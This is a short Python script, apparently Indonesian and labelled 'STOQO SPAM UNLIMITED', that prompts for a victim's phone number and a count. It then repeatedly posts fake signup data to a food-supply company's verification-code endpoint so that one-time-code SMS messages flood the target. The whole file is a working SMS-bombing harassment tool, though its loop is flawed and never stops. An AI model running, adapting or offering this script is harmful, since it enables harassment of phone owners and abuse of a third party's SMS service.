#!/usr/bin/python
# -*- coding: utf-8 -*-
# coded by syaid

import requests,json,time,subprocess

subprocess.call("clear", shell=True)

banner = """
                 ...         
            .x888888hx     
         d88888888888hxx  
        8" ... `"*8888%`  
       !  "   ` .xnxx.    
        X X   .H8888888%:  
         X 'hn8888888*"   > 
           X: `*88888%`     ! 
           '8h.. ``     ..x8> 
             `88888888888888f  
               '%8888888888*"   
                 ^"****""`     
         
            STOQO SPAM UNLIMITED

author by @syaidagil
                   
"""

x = 0
print banner
a = raw_input("[+] Nomor telepon : ")
d = raw_input("[+] COUNT : ")
while x < d:
   b = {"first_name":"Baibwt","last_name":"Haihwht","password":"jsiwbw8wh76t","phone":a}
   c =" https://api.stoqo.com/signup/generate_code/"
   e = requests.post(c, data=b)
   f = json.loads(e.text)
   if "nexmo_request_id" in f:
       print "[+] SUCESS WITH ID",f["nexmo_request_id"]
   else:
       print "[+] GAGAL.!!!"
